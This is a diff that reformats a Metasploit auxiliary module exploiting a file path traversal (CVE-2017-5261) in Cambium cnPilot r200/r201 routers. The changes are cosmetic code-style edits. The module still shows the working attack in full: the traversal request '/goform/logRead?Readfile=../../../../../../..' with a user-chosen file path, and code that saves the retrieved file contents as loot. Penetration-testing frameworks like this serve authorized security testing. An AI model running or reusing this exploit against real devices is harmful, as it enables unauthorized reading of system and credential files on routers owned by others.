@@ -7,24 +7,24 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::CNPILOT
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name' => 'Cambium cnPilot r200/r201 File Path Traversal',
-      'Description' => %{
-        This module exploits a File Path Traversal vulnerability in Cambium
-        cnPilot r200/r201 to read arbitrary files off the file system. Affected
-        versions - 4.3.3-R4 and prior.
-      },
-      'Author' =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Cambium cnPilot r200/r201 File Path Traversal',
+        'Description' => %q{
+          This module exploits a File Path Traversal vulnerability in Cambium
+          cnPilot r200/r201 to read arbitrary files off the file system. Affected
+          versions - 4.3.3-R4 and prior.
+        },
+        'Author' => [
           'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
         ],
-      'References' =>
-        [
+        'References' => [
           ['CVE', '2017-5261'],
           ['URL', 'https://www.rapid7.com/blog/post/2017/12/19/r7-2017-25-cambium-epmp-and-cnpilot-multiple-vulnerabilities/']
         ],
-      'License' => MSF_LICENSE
-     )
+        'License' => MSF_LICENSE
+      )
     )
 
     register_options(
@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_ALL_USERS', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASS_FILE', 'BLANK_PASSWORDS', 'BRUTEFORCE_SPEED', 'STOP_ON_SUCCESS')
   end
 
-  def run_host(ip)
+  def run_host(_ip)
     unless is_app_cnpilot?
       return
     end
@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status("#{rhost}:#{rport} - Accessing the file...")
     file = datastore['FILENAME']
     fileuri = "/goform/logRead?Readfile=../../../../../../..#{file}"
-    final_url = "#{(ssl ? 'https' : 'http')}" + '://' + "#{rhost}:#{rport}" + "#{fileuri}"
+    final_url = (ssl ? 'https' : 'http').to_s + '://' + "#{rhost}:#{rport}" + fileuri.to_s
 
     res = send_request_cgi(
       {
@@ -70,16 +70,16 @@ class MetasploitModule < Msf::Auxiliary
     if res && res.code == 200
       results = res.body
 
-      if results.size.zero?
+      if results.empty?
         print_status('File not found.')
       else
-        print_good("#{results}")
+        print_good(results.to_s)
 
         # w00t we got l00t
         loot_name = 'fpt-log'
         loot_type = 'text/plain'
         loot_desc = 'Cambium cnPilot File Path Traversal Results'
-        data = "#{results}"
+        data = results.to_s
         p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc)
         print_good("File saved in: #{p}")
       end
